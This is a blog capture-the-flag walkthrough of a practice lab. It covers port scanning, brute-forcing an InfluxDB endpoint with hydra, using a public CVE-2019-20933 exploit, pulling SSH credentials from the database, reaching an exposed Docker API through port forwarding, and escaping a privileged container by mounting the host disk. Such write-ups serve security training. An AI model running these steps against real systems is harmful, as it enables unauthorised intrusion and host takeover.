<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Language" content="en">
    <meta name="color-scheme" content="light dark">

    

    <meta name="author" content="monoloc0">
    <meta name="description" content="https://tryhackme.com/room/sweettoothinc
Enumeration    Port Scan - Task 2    Do a TCP portscan. What is the name of the database software running on one of these ports?  pre code { background-color: #eee; }  monoloco@kali:~/Dokumente/THM/sweettoothinc$ nmap -sC -sV -oA nmap/output sweettoothinc.thm Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-24 06:52 GMT Nmap scan report for sweettoothinc.thm (10.10.136.232) Host is up (0.051s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 33801/udp status | 100024 1 41313/udp6 status | 100024 1 51857/tcp6 status |_ 100024 1 57495/tcp status 2222/tcp open ssh OpenSSH 6.">
    <meta name="keywords" content="infosec,bugbounty,personal">

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Super-Spam"/>
<meta name="twitter:description" content="https://tryhackme.com/room/sweettoothinc
Enumeration    Port Scan - Task 2    Do a TCP portscan. What is the name of the database software running on one of these ports?  pre code { background-color: #eee; }  monoloco@kali:~/Dokumente/THM/sweettoothinc$ nmap -sC -sV -oA nmap/output sweettoothinc.thm Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-24 06:52 GMT Nmap scan report for sweettoothinc.thm (10.10.136.232) Host is up (0.051s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 33801/udp status | 100024 1 41313/udp6 status | 100024 1 51857/tcp6 status |_ 100024 1 57495/tcp status 2222/tcp open ssh OpenSSH 6."/>

    <meta property="og:title" content="Super-Spam" />
<meta property="og:description" content="https://tryhackme.com/room/sweettoothinc
Enumeration    Port Scan - Task 2    Do a TCP portscan. What is the name of the database software running on one of these ports?  pre code { background-color: #eee; }  monoloco@kali:~/Dokumente/THM/sweettoothinc$ nmap -sC -sV -oA nmap/output sweettoothinc.thm Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-24 06:52 GMT Nmap scan report for sweettoothinc.thm (10.10.136.232) Host is up (0.051s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 33801/udp status | 100024 1 41313/udp6 status | 100024 1 51857/tcp6 status |_ 100024 1 57495/tcp status 2222/tcp open ssh OpenSSH 6." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://monoloc0.github.io/sweettoothinc/" /><meta property="article:section" content="" />





    <title>
  Super-Spam · monoloc0
</title>

    
      <link rel="canonical" href="https://monoloc0.github.io/sweettoothinc/">
    

    <link rel="preload" href="https://monoloc0.github.io/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>

    
      
      
      <link rel="stylesheet" href="https://monoloc0.github.io/css/coder.min.843ee18d510f7cb1bb49110db117b99ea65489c095d620a5d79ea71693478e77.css" integrity="sha256-hD7hjVEPfLG7SRENsRe5nqZUicCV1iCl156nFpNHjnc=" crossorigin="anonymous" media="screen" />
    

    

    

    

    

    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-16x16.png" sizes="16x16">

    <link rel="apple-touch-icon" href="https://monoloc0.github.io/images/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://monoloc0.github.io/images/apple-touch-icon.png">

    <meta name="generator" content="Hugo 0.89.4" />
  </head>

  
  
  <body class="preload-transitions colorscheme-light">
    

    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="https://monoloc0.github.io/">
      monoloc0
    </a>
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/whoami/">whoami</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/writeups/">writeups</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/resources/">resources</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


      <div class="content">
        
  <section class="container page">
  <article>
    <header>
      <h1 class="title">
        <a class="title-link" href="https://monoloc0.github.io/sweettoothinc/">
          Super-Spam
        </a>
      </h1>
    </header>

    <p><em><a href="https://tryhackme.com/room/sweettoothinc">https://tryhackme.com/room/sweettoothinc</a></em></p>
<h1 id="enumeration">
  Enumeration
  <a class="heading-link" href="#enumeration">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<h2 id="port-scan---task-2">
  Port Scan - Task 2
  <a class="heading-link" href="#port-scan---task-2">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p>Do a TCP portscan. What is the name of the database software running on one of these ports?
<style>


pre code {
  background-color: #eee;

}


</style>
</p>
<pre tabindex="0"><code>monoloco@kali:~/Dokumente/THM/sweettoothinc$ nmap -sC -sV -oA nmap/output sweettoothinc.thm 
Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-24 06:52 GMT
Nmap scan report for sweettoothinc.thm (10.10.136.232)
Host is up (0.051s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33801/udp   status
|   100024  1          41313/udp6  status
|   100024  1          51857/tcp6  status
|_  100024  1          57495/tcp   status
2222/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)
|   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)
|   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)
|_  256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)
8086/tcp open  http    &lt;REDACTED&gt; http admin 1.3.0
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.71 seconds

</code></pre><p>The answer for task 2 can be seen in nmap output (port 8086)</p>
<h2 id="task-3">
  Task 3
  <a class="heading-link" href="#task-3">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p><strong>Question: What is the database user you find?</strong></p>
<p>Find Directory</p>
<p><img src="https://monoloc0.github.io/images/20210724234317.png" alt="20210724234317.png"></p>
<pre tabindex="0"><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8086 -f sweettoothinc.thm http-get /query
</code></pre><p><img src="https://monoloc0.github.io/images/20210724233333.png" alt="20210724233333.png"></p>
<p>Running <strong>Gobuster</strong> and <strong>Hydra</strong> didn&rsquo;t provide me with any useful information. So, I had a look at the documentation (as suggested in the discord channel - yes I was looking for a hint &hellip;)</p>
<p><a href="https://docs.influxdata.com/influxdb/v1.3/tools/api/#query">https://docs.influxdata.com/influxdb/v1.3/tools/api/#query</a></p>
<p>Voila, we found the usernname.</p>
<p><img src="https://monoloc0.github.io/images/20210725195715.png" alt="20210725195715.png"></p>
<p><strong>Question:  What was the temperature of the water tank at 1621346400 (UTC Unix Timestamp)?</strong></p>
<p><img src="https://monoloc0.github.io/images/20210725201022.png" alt="20210725201022.png"></p>
<p><a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933">https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</a></p>
<p><img src="https://monoloc0.github.io/images/20210725230444.png" alt="20210725230444.png"></p>
<p><img src="https://monoloc0.github.io/images/20210726200629.png" alt="20210726200629.png"></p>
<p>Answer 2 for task 3 can be found here ;)</p>
<p><img src="https://monoloc0.github.io/images/20210726201032.png" alt="20210726201032.png"></p>
<p><strong>What is the highest rpm the motor of the mixer reached?</strong></p>
<p><img src="https://monoloc0.github.io/images/20210726201210.png" alt="20210726201210.png"></p>
<p>Perform the following query to get answer 3 for task 3</p>
<pre tabindex="0"><code>select * from mixer_stats
</code></pre><p><img src="https://monoloc0.github.io/images/20210726202302.png" alt="20210726202302.png"></p>
<p>Follow the instructions shown on the picture below to get the next answer.</p>
<p><img src="https://monoloc0.github.io/images/20210726202550.png" alt="20210726202550.png"></p>
<p>We can also see the SSH password in the table which will help us to get the user flag.</p>
<p><strong>user.txt</strong></p>
<p>The gathered credentials from the question above can be used to login via ssh.</p>
<p><img src="https://monoloc0.github.io/images/20210726202652.png" alt="20210726202652.png"></p>
<p>There you go, &hellip; the user flag ;)</p>
<p><img src="https://monoloc0.github.io/images/20210726202834.png" alt="20210726202834.png"></p>
<h2 id="task-4">
  Task 4
  <a class="heading-link" href="#task-4">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p>Information Gathering using <strong>linpeas.sh</strong></p>
<p>The following entry attacted my attention:</p>
<p><img src="https://monoloc0.github.io/images/20210726232121.png" alt="20210726232121.png"></p>
<p>Unfortunately, the <strong>docker client</strong> isn&rsquo;t installed on the machine&hellip;</p>
<p>Therefore, I had to find another way to communicate with the <strong>docker host</strong>.</p>
<p>During Enumeration of the file <strong>/initializeandquery.sh</strong> I noticed the following line:</p>
<p><img src="https://monoloc0.github.io/images/20210726232329.png" alt="20210726232329.png"></p>
<p>It seems like, the <strong>Docker Host API</strong> is exposed inside the container and mapped to Port <strong>8080</strong> on the <strong>localhost</strong>.</p>
<p>Next, I configured a <strong>Local Port Forwarding</strong>, so that it&rsquo;s easier to communicate with the endpoint.</p>
<pre tabindex="0"><code>ssh -L 8080:localhost:8080 &lt;USERNAME&gt;@sweettoothinc.thm -p 2222
</code></pre><pre tabindex="0"><code>docker -H tcp://localhost:8081 ps
</code></pre><p><img src="https://monoloc0.github.io/images/20210728194727.png" alt="20210728194727.png"></p>
<p><img src="https://monoloc0.github.io/images/20210728195244.png" alt="20210728195244.png"></p>
<p><strong>Try to drop a reverse shell</strong></p>
<p><img src="https://monoloc0.github.io/images/20210728200701.png" alt="20210728200701.png"></p>
<p><a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/">https://dejandayoff.com/the-danger-of-exposing-docker.sock/</a></p>
<h2 id="task-5---escape">
  Task 5 - Escape
  <a class="heading-link" href="#task-5---escape">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#privileged-flag">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#privileged-flag</a></p>
<p><em>Well configured docker containers won&rsquo;t allow command like <strong>fdisk -l</strong>. However on missconfigured docker command where the flag &ndash;privileged is specified, it is possible to get the privileges to see the host drive.</em></p>
<p>Let&rsquo;s give that a try:</p>
<pre tabindex="0"><code>root@d6a515b25538:~# fdisk -l

Disk /dev/xvda: 16 GiB, 17179869184 bytes, 33554432 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xa8257195

Device     Boot    Start      End  Sectors  Size Id Type
/dev/xvda1 *        2048 32088063 32086016 15.3G 83 Linux
/dev/xvda2      32090110 33552383  1462274  714M  5 Extended
/dev/xvda5      32090112 33552383  1462272  714M 82 Linux swap / Solaris

Disk /dev/xvdh: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

</code></pre><p>So to take over the host machine, it is trivial:</p>
<pre tabindex="0"><code>mkdir -p /mnt/hola
mount /dev/xvda1 /mnt/hola
</code></pre><p><img src="https://monoloc0.github.io/images/20210728212814.png" alt="20210728212814.png"></p>

  </article>
</section>

  

      </div>

      <footer class="footer">
  <section class="container">
    ©
    
    2021
     monoloc0 


    
  </section>
</footer>

    </main>

    
      
      <script src="https://monoloc0.github.io/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js" integrity="sha256-A7F3afT5GuNWZ&#43;HyocqMFvUFYlds&#43;Q/zKzF5kmkU2qU="></script>
    

    

    

    

    

    

    

    

    
  </body>

</html>
